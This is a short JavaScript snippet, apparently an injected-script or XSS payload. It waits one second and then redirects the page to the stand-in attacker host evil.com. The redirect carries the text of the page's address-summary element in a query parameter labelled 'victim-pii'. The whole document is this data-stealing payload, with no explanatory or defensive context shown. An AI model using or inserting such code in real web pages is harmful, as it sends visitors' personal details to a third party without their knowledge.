await new Promise(r => setTimeout(r, 1000));
location.replace("//evil.com?victim-pii=" + document.querySelector('.address-summary').innerText);

